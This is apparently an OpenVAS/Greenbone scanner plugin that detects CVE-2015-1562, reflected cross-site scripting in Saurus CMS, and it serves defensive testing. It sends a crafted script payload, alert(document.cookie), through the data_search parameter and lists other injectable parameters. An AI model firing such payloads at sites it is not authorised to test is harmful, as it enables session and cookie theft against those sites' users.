if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.805367" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_cve_id( "CVE-2015-1562" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2015-04-13 10:15:43 +0530 (Mon, 13 Apr 2015)" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_name( "Saurus CMS Multiple XSS Vulnerabilities" );
	script_tag( name: "summary", value: "This host is installed with Saurus CMS
  and is prone to multiple xss vulnerabilities." );
	script_tag( name: "vuldetect", value: "Send a crafted request via HTTP GET and
  check whether it is able to read cookie or not." );
	script_tag( name: "insight", value: "Multiple errors exist as input passed via,

  - 'search' parameter to the 'user_management.php' script,

  - 'data_search' parameter to the 'profile_data.php' script,

  - 'filter' parameter to the 'error_log.ph' script,
  are not validated before returning it to users." );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker
  to execute arbitrary HTML and script code in the context of an affected site." );
	script_tag( name: "affected", value: "Saurus CMS version 4.7, Prior versions
  may also be affected." );
	script_tag( name: "solution", value: "Upgrade to the Saurus CMS v. 4.7
  release-date:27.01.2015 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "http://seclists.org/fulldisclosure/2015/Jan/112" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://www.saurus.info" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
http_port = http_get_port( default: 80 );
for dir in nasl_make_list_unique( "/", "/cms", "/sauruscms", http_cgi_dirs( port: http_port ) ) {
	if(dir == "/"){
		dir = "";
	}
	rcvRes = http_get_cache( item: NASLString( dir, "/admin/" ), port: http_port );
	if(ContainsString( rcvRes, ">Saurus CMS" )){
		url = dir + "/admin/profile_data.php?data_search=%22%3E%3Cscript%3E" + "alert(document.cookie)%3C/script%3E%3C!--&profile_search=&profile_id=0";
		if(http_vuln_check( port: http_port, url: url, check_header: TRUE, pattern: "alert\\(document\\.cookie\\)" )){
			report = http_report_vuln_url( port: http_port, url: url );
			security_message( port: http_port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

